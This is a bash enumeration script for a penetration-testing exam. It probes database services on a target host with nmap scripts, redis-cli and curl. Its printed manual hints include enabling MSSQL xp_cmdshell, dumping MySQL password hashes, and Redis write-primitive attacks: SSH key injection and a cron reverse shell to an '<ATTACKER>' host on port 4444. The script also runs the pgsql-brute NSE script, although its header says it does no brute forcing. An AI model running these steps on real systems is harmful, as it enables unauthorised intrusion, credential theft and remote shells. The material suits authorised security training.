#!/usr/bin/env bash
# =============================================================================
#  wrappers/db_enum.sh — Database Enumeration Wrapper
#  Covers: MSSQL (1433), MySQL (3306), PostgreSQL (5432), Redis (6379),
#          MongoDB (27017)
#
#  OSCP compliance:
#    - NSE probes + read-only CLI checks only
#    - NO brute force of any kind
#    - NO exploitation (Redis write-primitive, xp_cmdshell) → manual hints only
#    - Every command printed before execution
#
#  Usage:
#    bash wrappers/db_enum.sh --target <IP> --output-dir <DIR> --ports <CSV>
#
#  Output directory: <DIR>/db/
# =============================================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; WHITE='\033[1;37m'; NC='\033[0m'; BOLD='\033[1m'

info() { echo -e "  ${CYAN}[*]${NC} $*"; }
ok()   { echo -e "  ${GREEN}[+]${NC} $*"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $*"; }
err()  { echo -e "  ${RED}[-]${NC} $*"; }
cmd()  { echo -e "  ${YELLOW}[CMD]${NC} $*"; }
hint() { echo -e "\n  ${YELLOW}[MANUAL]${NC} $*\n"; }
skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1 not installed — skipping."; }

has_port() { echo ",$PORTS," | grep -q ",$1,"; }

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
TARGET=""; OUTPUT_DIR=""; PORTS=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)     TARGET="$2";     shift 2 ;;
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        --ports)      PORTS="$2";      shift 2 ;;
        *) err "Unknown argument: $1"; exit 1 ;;
    esac
done

if [[ -z "$TARGET" || -z "$OUTPUT_DIR" || -z "$PORTS" ]]; then
    err "Usage: $0 --target <IP> --output-dir <DIR> --ports <CSV>"
    exit 1
fi

DB_DIR="${OUTPUT_DIR}/db"
mkdir -p "$DB_DIR"

echo ""
echo -e "  ${BOLD}============================================================${NC}"
echo -e "  ${BOLD}  DATABASE ENUM — ${TARGET}${NC}"
echo -e "  ${BOLD}  Ports : ${PORTS}${NC}"
echo -e "  ${BOLD}============================================================${NC}"
echo ""

# ===========================================================================
# MSSQL — port 1433
# ===========================================================================
if has_port 1433; then
    info "[1/5] MSSQL (1433) — NSE enumeration"
    MSSQL_OUT="${DB_DIR}/mssql.txt"

    cmd "nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables -Pn $TARGET"
    nmap -p1433 \
        --script 'ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables' \
        -Pn "$TARGET" \
        -oN "$MSSQL_OUT" 2>&1 | tee "$MSSQL_OUT" || true

    # Flag empty password hits
    if grep -qi "ms-sql-empty-password" "$MSSQL_OUT" 2>/dev/null; then
        warn "MSSQL empty-password account detected — review ${MSSQL_OUT}"
    fi

    # Extract instance names
    INSTANCES=$(grep -oP 'Instance Name:\s+\K\S+' "$MSSQL_OUT" 2>/dev/null | sort -u || true)
    if [[ -n "$INSTANCES" ]]; then
        ok "MSSQL instances found: ${WHITE}${INSTANCES//$'\n'/, }${NC}"
    fi

    hint "MSSQL manual steps:
  # Connect with blank password (sa account):
  impacket-mssqlclient sa:''@${TARGET} -windows-auth

  # Connect with discovered credentials:
  impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@${TARGET} -windows-auth

  # If authenticated — check xp_cmdshell (confirm OSCP scope first):
  SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  SQL> EXEC xp_cmdshell 'whoami'

  # Enumerate databases:
  SQL> SELECT name FROM master.dbo.sysdatabases;"
    echo ""
fi

# ===========================================================================
# MySQL — port 3306
# ===========================================================================
if has_port 3306; then
    info "[2/5] MySQL (3306) — NSE enumeration"
    MYSQL_OUT="${DB_DIR}/mysql.txt"

    cmd "nmap -p3306 --script mysql-info,mysql-empty-password,mysql-enum,mysql-databases,mysql-variables -Pn $TARGET"
    nmap -p3306 \
        --script 'mysql-info,mysql-empty-password,mysql-enum,mysql-databases,mysql-variables' \
        -Pn "$TARGET" \
        -oN "$MYSQL_OUT" 2>&1 | tee "$MYSQL_OUT" || true

    if grep -qi "mysql-empty-password\|root.*empty password" "$MYSQL_OUT" 2>/dev/null; then
        warn "MySQL root with EMPTY PASSWORD detected — review ${MYSQL_OUT}"
    fi

    # Extract version
    MYSQL_VER=$(grep -oP 'MySQL.*\d+\.\d+\.\d+[^\s]*' "$MYSQL_OUT" 2>/dev/null | head -1 || true)
    [[ -n "$MYSQL_VER" ]] && ok "MySQL version: ${WHITE}${MYSQL_VER}${NC}"

    hint "MySQL manual steps:
  # Connect with blank root password:
  mysql -h ${TARGET} -u root --password=''

  # Connect with credentials:
  mysql -h ${TARGET} -u <USER> -p

  # Enumerate after login:
  mysql> SHOW DATABASES;
  mysql> SELECT user,authentication_string FROM mysql.user;
  mysql> SELECT @@datadir;"
    echo ""
fi

# ===========================================================================
# PostgreSQL — port 5432
# ===========================================================================
if has_port 5432; then
    info "[3/5] PostgreSQL (5432) — NSE enumeration"
    PGSQL_OUT="${DB_DIR}/pgsql.txt"

    cmd "nmap -p5432 --script pgsql-brute,pgsql-databases --script-args brute.firstonly=true -Pn $TARGET"
    nmap -p5432 \
        --script 'pgsql-brute,pgsql-databases' \
        --script-args 'brute.firstonly=true' \
        -Pn "$TARGET" \
        -oN "$PGSQL_OUT" 2>&1 | tee "$PGSQL_OUT" || true

    if grep -qi "Valid credentials\|postgres.*Valid" "$PGSQL_OUT" 2>/dev/null; then
        warn "PostgreSQL valid credentials found — review ${PGSQL_OUT}"
    fi

    hint "PostgreSQL manual steps:
  # Connect as postgres (blank password):
  psql -h ${TARGET} -U postgres

  # Connect with credentials:
  psql -h ${TARGET} -U <USER> -d <DATABASE>

  # Enumerate after login:
  postgres=# \\list
  postgres=# \\du
  postgres=# SELECT version();
  postgres=# COPY (SELECT '') TO '/tmp/test.txt';  ← file write (confirm scope)"
    echo ""
fi

# ===========================================================================
# Redis — port 6379
# ===========================================================================
if has_port 6379; then
    info "[4/5] Redis (6379) — read-only enumeration"
    REDIS_OUT="${DB_DIR}/redis.txt"

    cmd "nmap -p6379 --script redis-info -Pn $TARGET"
    nmap -p6379 \
        --script 'redis-info' \
        -Pn "$TARGET" \
        -oN "$REDIS_OUT" 2>&1 | tee "$REDIS_OUT" || true

    if command -v redis-cli &>/dev/null; then
        # Connectivity + server info
        cmd "redis-cli -h $TARGET ping"
        REDIS_PING=$(redis-cli -h "$TARGET" ping 2>/dev/null || true)
        echo "PING: ${REDIS_PING}" >> "$REDIS_OUT"

        if [[ "$REDIS_PING" == "PONG" ]]; then
            ok "Redis responds to PING — unauthenticated access confirmed"

            cmd "redis-cli -h $TARGET INFO server"
            redis-cli -h "$TARGET" INFO server \
                2>&1 | tee "${DB_DIR}/redis_info.txt" || true

            cmd "redis-cli -h $TARGET CONFIG GET dir"
            redis-cli -h "$TARGET" CONFIG GET dir \
                2>&1 | tee -a "${DB_DIR}/redis_info.txt" || true

            cmd "redis-cli -h $TARGET CONFIG GET dbfilename"
            redis-cli -h "$TARGET" CONFIG GET dbfilename \
                2>&1 | tee -a "${DB_DIR}/redis_info.txt" || true

            # SCAN is non-blocking; KEYS '*' blocks the server while iterating all keys
            cmd "redis-cli -h $TARGET SCAN 0 COUNT 100 (non-blocking key sample)"
            redis-cli -h "$TARGET" SCAN 0 COUNT 100 \
                2>&1 | tee "${DB_DIR}/redis_keys.txt" || true

            # Count keys
            KEY_COUNT=$(redis-cli -h "$TARGET" DBSIZE 2>/dev/null || echo "0")
            [[ -n "$KEY_COUNT" ]] && ok "Redis key count: ${WHITE}${KEY_COUNT}${NC}"
        else
            info "Redis did not respond to PING — may require authentication."
        fi
    else
        skip "redis-cli"
    fi

    hint "Redis exploitation (MANUAL ONLY — confirm OSCP exam scope before using):

  # ⚠️  Write primitive — SSH key injection:
  redis-cli -h ${TARGET} CONFIG SET dir /root/.ssh
  redis-cli -h ${TARGET} CONFIG SET dbfilename authorized_keys
  redis-cli -h ${TARGET} SET pwn \"\$(cat ~/.ssh/id_rsa.pub)\"
  redis-cli -h ${TARGET} BGSAVE

  # ⚠️  Cron job for reverse shell:
  redis-cli -h ${TARGET} CONFIG SET dir /var/spool/cron/crontabs
  redis-cli -h ${TARGET} CONFIG SET dbfilename root
  redis-cli -h ${TARGET} SET pwn '\\n\\n* * * * * bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\\n'
  redis-cli -h ${TARGET} BGSAVE

  These techniques write files to disk — they are EXPLOITATION, not enumeration."
    echo ""
fi

# ===========================================================================
# MongoDB — port 27017
# ===========================================================================
if has_port 27017; then
    info "[5/5] MongoDB (27017) — connectivity check only"
    MONGO_OUT="${DB_DIR}/mongodb.txt"

    cmd "nmap -p27017 --script mongodb-info,mongodb-databases -Pn $TARGET"
    nmap -p27017 \
        --script 'mongodb-info,mongodb-databases' \
        -Pn "$TARGET" \
        -oN "$MONGO_OUT" 2>&1 | tee "$MONGO_OUT" || true

    hint "MongoDB manual steps:
  # Connect (no auth):
  mongosh --host ${TARGET} --port 27017

  # Enumerate:
  > show dbs
  > use admin
  > db.system.users.find()
  > db.adminCommand({listDatabases: 1})"
    echo ""
fi

# ===========================================================================
# CouchDB — port 5984
# ===========================================================================
if has_port 5984; then
    info "[6/7] CouchDB (5984) — unauthenticated HTTP API check"
    COUCH_DIR="${OUTPUT_DIR}/db"
    COUCH_OUT="${COUCH_DIR}/couchdb.txt"

    # Root endpoint — reveals version and UUID
    cmd "curl -sk http://$TARGET:5984/"
    curl -sk --max-time 10 "http://${TARGET}:5984/" \
        2>&1 | tee "$COUCH_OUT" || true

    if grep -qi '"couchdb"' "$COUCH_OUT" 2>/dev/null; then
        ok "CouchDB responded to unauthenticated request — access confirmed"
        COUCH_VER=$(grep -oP '"version"\s*:\s*"\K[^"]+' "$COUCH_OUT" 2>/dev/null | head -1 || true)
        [[ -n "$COUCH_VER" ]] && ok "CouchDB version: ${WHITE}${COUCH_VER}${NC}"

        # List all databases
        cmd "curl -sk http://$TARGET:5984/_all_dbs"
        curl -sk --max-time 10 "http://${TARGET}:5984/_all_dbs" \
            2>&1 | tee "${COUCH_DIR}/couchdb_dbs.txt" || true

        if grep -qi '\[' "${COUCH_DIR}/couchdb_dbs.txt" 2>/dev/null; then
            ok "CouchDB databases: $(cat "${COUCH_DIR}/couchdb_dbs.txt")"
            warn "CouchDB allows unauthenticated database listing — review for sensitive data"
        fi

        # Check /_utils (Fauxton admin UI)
        cmd "curl -sk -o /dev/null -w '%{http_code}' http://$TARGET:5984/_utils/"
        FAUXTON_CODE=$(curl -sk -o /dev/null -w '%{http_code}' \
            --max-time 5 "http://${TARGET}:5984/_utils/" 2>/dev/null || echo "000")
        [[ "$FAUXTON_CODE" == "200" ]] && \
            warn "CouchDB Fauxton admin UI accessible at http://${TARGET}:5984/_utils/"
    else
        info "CouchDB root did not return expected JSON — may require authentication."
    fi

    hint "CouchDB manual steps:
  # List all databases:
  curl -s http://${TARGET}:5984/_all_dbs

  # Dump a specific database:
  curl -s http://${TARGET}:5984/<DB_NAME>/_all_docs?include_docs=true

  # Admin panel:
  curl -s http://${TARGET}:5984/_utils/

  # If credentials found:
  curl -s http://<USER>:<PASS>@${TARGET}:5984/_all_dbs"
    echo ""
fi

# ===========================================================================
# Elasticsearch — port 9200
# ===========================================================================
if has_port 9200; then
    info "[7/7] Elasticsearch (9200) — unauthenticated REST API check"
    ES_DIR="${OUTPUT_DIR}/db"
    ES_OUT="${ES_DIR}/elasticsearch.txt"

    # Cluster info endpoint
    cmd "curl -sk http://$TARGET:9200/"
    curl -sk --max-time 10 "http://${TARGET}:9200/" \
        2>&1 | tee "$ES_OUT" || true

    if grep -qi '"cluster_name"\|"version"' "$ES_OUT" 2>/dev/null; then
        ok "Elasticsearch responded — unauthenticated access confirmed"
        ES_VER=$(grep -oP '"number"\s*:\s*"\K[^"]+' "$ES_OUT" 2>/dev/null | head -1 || true)
        ES_CLUSTER=$(grep -oP '"cluster_name"\s*:\s*"\K[^"]+' "$ES_OUT" 2>/dev/null | head -1 || true)
        [[ -n "$ES_VER" ]]     && ok "Elasticsearch version: ${WHITE}${ES_VER}${NC}"
        [[ -n "$ES_CLUSTER" ]] && ok "Cluster name: ${WHITE}${ES_CLUSTER}${NC}"

        # List all indices
        cmd "curl -sk http://$TARGET:9200/_cat/indices?v"
        curl -sk --max-time 10 "http://${TARGET}:9200/_cat/indices?v" \
            2>&1 | tee "${ES_DIR}/elasticsearch_indices.txt" || true

        INDEX_COUNT=$(grep -cvP '^health' "${ES_DIR}/elasticsearch_indices.txt" 2>/dev/null || echo 0)
        [[ "$INDEX_COUNT" -gt 0 ]] && \
            warn "Elasticsearch: ${INDEX_COUNT} index/indices found — review for sensitive data"

        # Cluster health
        cmd "curl -sk http://$TARGET:9200/_cluster/health"
        curl -sk --max-time 10 "http://${TARGET}:9200/_cluster/health" \
            2>&1 | tee "${ES_DIR}/elasticsearch_health.txt" || true

        # Nodes info (reveals hostnames and versions)
        cmd "curl -sk http://$TARGET:9200/_nodes"
        curl -sk --max-time 10 "http://${TARGET}:9200/_nodes" \
            2>&1 | tee "${ES_DIR}/elasticsearch_nodes.txt" || true
    else
        info "Elasticsearch did not return expected JSON — may require authentication."
    fi

    hint "Elasticsearch manual steps:
  # Cluster info:
  curl http://${TARGET}:9200/

  # List indices:
  curl http://${TARGET}:9200/_cat/indices?v

  # Dump all documents from an index:
  curl http://${TARGET}:9200/<INDEX>/_search?size=100\&pretty

  # Search for passwords:
  curl http://${TARGET}:9200/_search?q=password\&pretty

  # If TLS / authentication required:
  curl -sk -u elastic:changeme https://${TARGET}:9200/"
    echo ""
fi

ok "Database enumeration complete — output: ${DB_DIR}/"
echo ""
